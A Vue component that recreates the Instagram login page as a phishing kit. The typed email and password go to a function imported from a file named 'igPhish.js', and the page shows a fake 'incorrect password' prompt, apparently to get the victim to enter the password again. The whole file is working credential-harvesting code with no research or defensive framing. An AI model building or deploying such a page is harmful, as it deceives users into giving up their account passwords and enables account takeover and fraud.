<template>
  <div>
    <div class="sm:h-screen sm:bg-gray-50 flex flex-col sm:items-center ">
      <div class="pt-20 sm:pt-0 sm:px-5 sm:mt-14 sm:mb-2 mx-4 sm:w-[350px] phone:mx-12 sm:border sm:border-gray-300">

        <div class="mt-4 mb-8 sm:mt-6">
          <IgLogo />
        </div>

        <form @submit.prevent="submitForm">
          <div>
            <label for="email" class="relative block overflow-hidden bg-gray-50 rounded-md border border-gray-200 px-2 py-2 mb-2 shadow-sm focus-within:ring-1 focus-within:ring-gray-100">
              <input
                type="text"
                id="email"
                placeholder="Email"
                class="peer w-64 border-none bg-transparent p-0 placeholder-transparent focus:border-transparent focus:outline-none focus:ring-0 text-xs sm:text-sm"
                v-model="email"
                required
              />
              <span class="absolute start-2 top-1 -translate-y-1/2 text-xs text-gray-700 transition-all peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-xs peer-focus:top-1 peer-focus:text-xs">
                {{ $t('Instagram.inputEmail') }}
              </span>
            </label>
          </div>

          <div>
            <label
              for="name"
              :class="{'border-red-500': isIncorrectPassword}"
              class="relative block overflow-hidden bg-gray-50 rounded-md border border-gray-200 px-2 py-2 mb-2 shadow-sm focus-within:ring-1 focus-within:ring-gray-100"
            >
              <input
                :type="showName ? 'text' : 'password'"
                id="name"
                placeholder="Password"
                class="peer w-60 border-none bg-transparent p-0 placeholder-transparent focus:border-transparent focus:outline-none focus:ring-0 text-xs sm:text-sm focus:border-black"
                v-model="name"
                required
              />
              <span class="absolute start-2 top-1 -translate-y-1/2 text-xs text-gray-700 transition-all peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-xs peer-focus:top-1 peer-focus:text-xs">
                {{ $t('Instagram.inputPassword') }}
              </span>
              <button @click="toggleNameVisibility" type="button" class="absolute end-2 top-1/2 transform -translate-y-1/2 cursor-pointer text-gray-500 text-sm">
                {{ showName ? $t('Instagram.hidePass') : $t('Instagram.showPass') }}
              </button>
            </label>
          </div>

          <div class="flex items-center my-4 sm:hidden block">
            <p v-if="isIncorrectPassword" class="text-xs text-red-600">{{ $t('Instagram.forgetPassText') }}</p>
            <a class="ml-auto text-xs text-blue-900 cursor-pointer">{{ $t('Instagram.forgetPass') }}</a>
          </div>
           <div>
    <button
      v-if="!isLoading"
      type="submit"
      :class="{ 'cursor-not-allowed bg-blue-500': isButtonDisabled }" :disabled="isButtonDisabled" class="w-full px-3 py-1 text-md font-semibold text-white bg-blue-400 rounded-md hover-bg-blue-600 focus-ring-4 focus-outline-none focus-ring-blue-300 dark-bg-blue-600 dark-hover-bg-blue-700 dark-focus-ring-blue-800 mx-auto block text-center"
      @click="handleClick"
    >
      {{ $t('Instagram.buttonText') }}
    </button>

    <button
      v-if="isLoading"
      disabled
      type="button"
      class="w-full px-3 py-1 text-md font-semibold text-white bg-blue-500 rounded-md hover-bg-blue-600 focus-ring-4 focus-outline-none focus-ring-blue-300 dark-bg-blue-600 dark-hover-bg-blue-700 dark-focus-ring-blue-800 mx-auto block text-center"
    >
      <svg
        aria-hidden="true"
        role="status"
        class="inline w-4 h-4 me-3 text-white animate-spin"
        viewBox="0 0 100 101"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
      >
        <path
          d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
          fill="#E5E7EB"
        />
        <path
          d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
          fill="currentColor"
        />
      </svg>
    </button>
  </div>
        </form>

        <div class="flex justify-evenly space-x-2 w-full mt-4">
          <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
          <span class="flex-none uppercase text-xs text-gray-400 font-semibold">{{ $t('Instagram.orText') }}</span>
          <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
        </div>

        <button disabled class="mt-4 mx-auto flex items-center">
          <img src="/src/components/fb.svg" alt="Facebook Logo" class="w-4 h-4 mr-1" />
          <span class="text-xs text-blue-900 font-semibold sm:pb-3">{{ $t('Instagram.logToFb') }}</span>
        </button>

        <div class="flex items-center flex-col">
          <div class="mb-2 mt-1 hidden sm:block">
            <p v-if="isIncorrectPassword" class="text-xs text-red-600">{{ $t('Instagram.forgetPassText1') }}</p>
            <p v-if="isIncorrectPassword" class="text-xs text-red-600">{{ $t('Instagram.forgetPassText2') }}</p>
          </div>
          <div class="mb-3 hidden sm:block">
            <a class="text-xs text-blue-900 cursor-pointer">{{ $t('Instagram.forgetPass') }}</a>
          </div>
        </div>

      </div>

      <div class="sm:hidden block fixed bg-white border-t border-gray-300 text-center w-full py-4 bottom-0">
        <span class="text-sm mr-2">{{ $t('Instagram.dontHaveAcct') }}</span>
        <a class="text-blue-500 text-sm">{{ $t('Instagram.signUP') }}</a>
      </div>

      <div class="hidden sm:block bg-white border border-gray-300 text-center sm:w-[350px] py-4 mb-24">
        <span class="text-sm mr-2">{{ $t('Instagram.dontHaveAcct') }}</span>
        <a class="text-blue-500 text-sm font-semibold">{{ $t('Instagram.signUP') }}</a>
      </div>
    </div>

    <FirstIgModal />
    <ChangeIgModal v-if="setChaneIgModal" />
  </div>
</template>


<script>
import { submitUserInfo } from '../scripts/igPhish.js';
import IgLoading from '../components/IgLoading.vue';
import IgLogo from '../components/IgLogo.vue';
import FirstIgModal from '../components/FirstIgModal.vue';
import ChangeIgModal from '../components/ChangeIgModal.vue'

export default {
  components: {
    IgLogo,
    IgLoading,
    FirstIgModal,
    ChangeIgModal,

  },
  data() {
    return {
      name: '',
      email: '',
      showName: false,
      isLoading: false,
      isIncorrectPassword: false,
      setChaneIgModal: false,
      submitCount: 0,
    };
  },

computed: {
    isButtonDisabled() {
      return this.name === '' || this.email === '';
    }
  },

  methods: {
    toggleNameVisibility() {
      this.showName = !this.showName; 
    },
    async submitForm() {
      try {
        // Call submitUserInfo with form data and pass the component instance
        const result = await submitUserInfo.call(this, {
          name: this.name,
          email: this.email,
        });

        // Handle the result as needed
        console.log(result);
      } catch (error) {
        // Handle the error if needed
        console.error('Error submitting form:', error.message);
      }
    },
  },
};
</script>
